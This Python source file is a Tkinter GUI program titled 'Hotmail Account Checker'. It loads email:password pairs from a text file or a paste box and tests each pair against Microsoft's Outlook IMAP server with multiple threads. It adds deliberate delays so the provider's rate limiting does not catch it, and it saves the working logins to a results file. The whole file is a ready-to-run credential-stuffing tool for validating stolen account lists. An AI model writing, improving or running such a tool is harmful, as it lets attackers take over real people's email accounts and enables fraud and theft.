import imaplib
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import time
import os

# Set max number of threads
MAX_THREADS = 10

def check_hotmail_login(email, password, valid_accounts, failed_accounts, progress_callback):
    """Attempts to log into a Hotmail account using IMAP."""
    try:
        mail = imaplib.IMAP4_SSL('outlook.office365.com', timeout=10)  # 10s timeout
        mail.login(email, password)
        mail.logout()
        valid_accounts.append(f'{email}:{password}')
        success_listbox.insert(tk.END, email)  # Update GUI
    except Exception:
        failed_accounts.append(f'{email}:{password}')
        fail_listbox.insert(tk.END, email)  # Update GUI
    finally:
        progress_callback()  # Update progress bar

def upload_file():
    """Opens a file dialog to select a file with credentials."""
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    threading.Thread(target=process_accounts, args=(file_path,)).start()

def process_accounts(file_path=None):
    """Processes accounts from a file or pasted input using threading."""
    os.makedirs("results", exist_ok=True)  # Ensure results folder exists
    output_file = 'results/valid_accounts.txt'  
    failed_file = 'results/failed_accounts.txt'  
    
    accounts = []

    # Read from file if uploaded
    if file_path:
        with open(file_path, 'r') as f:
            accounts += [line.strip().split(':') for line in f.readlines()]

    # Read from the text box input
    pasted_data = text_box.get("1.0", tk.END).strip()
    if pasted_data:
        accounts += [line.strip().split(':') for line in pasted_data.split("\n")]

    if not accounts:
        messagebox.showerror("No Accounts Found", "Please upload a file or paste credentials.")
        return

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)

    progress_label.config(text="Checking accounts...")
    progress_var.set(0)
    progress_bar["maximum"] = total
    success_listbox.delete(0, tk.END)
    fail_listbox.delete(0, tk.END)

    def update_progress():
        progress_var.set(progress_var.get() + 1)
        success_label.config(text=f"✅ Successful: {len(valid_accounts)}")
        fail_label.config(text=f"❌ Failed: {len(failed_accounts)}")
        progress_label.config(text=f"Checked {progress_var.get()}/{total}")
        root.update_idletasks()

    # Create threads for faster execution
    threads = []
    for index, credentials in enumerate(accounts):
        if len(credentials) != 2:
            continue  # Skip invalid lines

        email, password = credentials
        
        while threading.active_count() > MAX_THREADS:
            time.sleep(0.1)  # Wait if too many threads are running

        thread = threading.Thread(target=check_hotmail_login, args=(email, password, valid_accounts, failed_accounts, update_progress))
        threads.append(thread)
        thread.start()
        time.sleep(0.5)  # Delay to avoid rate limiting

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Save results
    with open(output_file, 'w') as f:
        f.write('\n'.join(valid_accounts))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed_accounts))

    progress_label.config(text=f"✅ Done! {len(valid_accounts)} valid, {len(failed_accounts)} failed.")
    messagebox.showinfo("Process Complete", "Account checking is done! Check the 'results' folder.")

def open_results_folder():
    """Opens the results folder."""
    os.system("xdg-open results" if os.name == "posix" else "start results")

def create_gui():
    """Creates the main GUI for the application."""
    global root, progress_label, text_box, progress_var, progress_bar
    global success_listbox, fail_listbox, success_label, fail_label

    root = tk.Tk()
    root.title("Hotmail Account Checker")
    root.geometry("600x450")

    label = tk.Label(root, text="Upload a file or paste credentials below:", font=("Arial", 12))
    label.pack(pady=5)

    upload_button = tk.Button(root, text="Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(pady=5)

    text_box = tk.Text(root, height=5, width=60)
    text_box.pack(pady=5)

    check_button = tk.Button(root, text="Check Accounts", command=lambda: threading.Thread(target=process_accounts).start(), font=("Arial", 10), bg="lightgreen")
    check_button.pack(pady=5)

    progress_var = tk.IntVar()
    progress_bar = ttk.Progressbar(root, length=500, variable=progress_var, mode="determinate")
    progress_bar.pack(pady=5)

    progress_label = tk.Label(root, text="", font=("Arial", 10))
    progress_label.pack(pady=5)

    # Success & failure listboxes
    frame = tk.Frame(root)
    frame.pack(pady=5, fill="both", expand=True)

    success_frame = tk.Frame(frame)
    success_frame.pack(side="left", padx=10, fill="both", expand=True)
    tk.Label(success_frame, text="✅ Successful Logins", font=("Arial", 10)).pack()
    success_listbox = tk.Listbox(success_frame, height=10, width=30)
    success_listbox.pack()

    fail_frame = tk.Frame(frame)
    fail_frame.pack(side="right", padx=10, fill="both", expand=True)
    tk.Label(fail_frame, text="❌ Failed Logins", font=("Arial", 10)).pack()
    fail_listbox = tk.Listbox(fail_frame, height=10, width=30)
    fail_listbox.pack()

    # Success & failure count labels
    success_label = tk.Label(root, text="✅ Successful: 0", font=("Arial", 10))
    success_label.pack()
    fail_label = tk.Label(root, text="❌ Failed: 0", font=("Arial", 10))
    fail_label.pack()

    # Open results button
    open_results_button = tk.Button(root, text="📂 Open Results Folder", command=open_results_folder, font=("Arial", 10), bg="gray")
    open_results_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
